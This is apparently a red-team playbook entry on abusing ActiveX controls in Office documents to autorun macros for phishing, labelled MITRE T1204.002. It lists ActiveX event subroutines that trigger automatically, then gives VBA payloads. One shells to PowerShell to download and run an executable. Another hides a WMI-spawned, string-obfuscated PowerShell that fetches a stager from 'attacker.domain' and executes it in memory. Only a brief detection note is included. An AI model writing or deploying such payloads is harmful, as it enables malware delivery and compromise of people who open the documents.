# ActiveX controls for macro execution




## Store Payload

* File -> Options -> Customize Ribbon -> Add developer tab
* Developer tab -> Controls -> Legacy Tools -> More Options
* More infos via here: http://www.greyhathacker.net/?p=948

## Autorun

| ActiveX Control | Subroutine name |
| --------------- | --------------- |
| Microsoft Forms 2.0 Frame | Frame1_Layout |
| Microsoft Forms 2.0 MultiPage | MultiPage1_Layout |
| Microsoft ImageComboBox Control, version 6.0 | ImageCombo21_Change |
| Microsoft InkEdit Control | InkEdit1_GotFocus |
| Microsoft InkPicture Control | InkPicture1_Painted, InkPicture1_Painting, InkPicture1_Resize |
| System Monitor Control | SystemMonitor1_GotFocus, SystemMonitor1_LostFocus |
| Microsoft Web Browser | WebBrowser1_BeforeNavigate2, WebBrowser1_BeforeScriptExecute, WebBrowser1_DocumentComplete, WebBrowser1_DownloadBegin, WebBrowser1_DownloadComplete, WebBrowser1_FileDownload, WebBrowser1_NavigateComplete2, WebBrowser1_NavigateError, WebBrowser1_ProgressChange, WebBrowser1_PropertyChange, WebBrowser1_SetSecureLockIcon, WebBrowser1_StatusTextChange, WebBrowser1_TitleChange |

## Execution

1. Uses InkEdit - a subroutine coming from an ActiveX control to execute its code.
2. downloading and executing an executable file using cmd.exe and PowerShell

### On disc

```vb
Sub InkEdit1_GotFocus()
Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://trusted.domain/file.exe','file.exe');Start-Process 'file.exe'", vbNormalFocus)
End Sub
```

### In memory

```vb
Sub InkEdit1_GotFocus()
    Debugging
End Sub

Public Function Debugging() As Variant
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
    objProcess.Create "powe" & "rshell.e" & "xe" & " -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if ([IntPtr]::size -eq 4) {(new-object Net.WebClient).DownloadString('https://attacker.domain/stager1.ps1') | iex } else {(new-object Net.WebClient).DownloadString('https://attacker.domain/stager2.ps1') | iex}"
End Function
```

## Detection

* Notification: "Some active content has been disabled, Click here to find out more"
* On disc and in-memory execution


## Tools
########
########

```meta
ttp: T1204.002
internal: false
requirements: 
results: user, admin
description: Using ActiveX controls in order to trigger execution via phishing
```